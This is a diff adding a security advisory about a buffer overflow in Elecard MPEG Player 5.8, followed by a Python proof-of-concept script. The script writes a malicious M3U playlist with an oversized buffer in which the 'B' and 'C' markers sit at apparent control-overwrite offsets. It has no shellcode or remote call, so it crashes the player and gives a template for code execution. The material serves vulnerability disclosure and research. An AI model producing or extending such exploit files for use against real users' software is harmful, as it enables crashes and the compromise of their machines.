@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/59534/info
+
+Elecard MPEG Player is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.
+
+Attackers can execute arbitrary code in the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+Elecard MPEG Player 5.8 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/python 
+# Exploit Title:Elecard MPEG Player 5.8 Local PoC 
+# Download link :www.elecard.com/assets/files/distribs/mpeg-player/EMpgPlayer.zip
+# Product: Vulnerable
+# Elecard MPEG Player,Elecard AVC HD Player
+# RST
+# Date (found): 27.04.2013
+# Date (publish): 27.04.2013
+# Author: metacom
+# version:5.8.121004
+# Category: poc
+# Tested on: windows 7 German  
+
+head="#EXTM3U\n"
+head+="#EXTINF:153,Artist - song\n"
+filename= "elecard.m3u"
+
+buffer= "\x41" * 783
+buffer+="\x42" * 4 
+buffer+="\x43" * 4
+buffer+="\x44" * 25000
+
+textfile = open(filename , 'w')
+textfile.write(head+buffer)
+textfile.close()
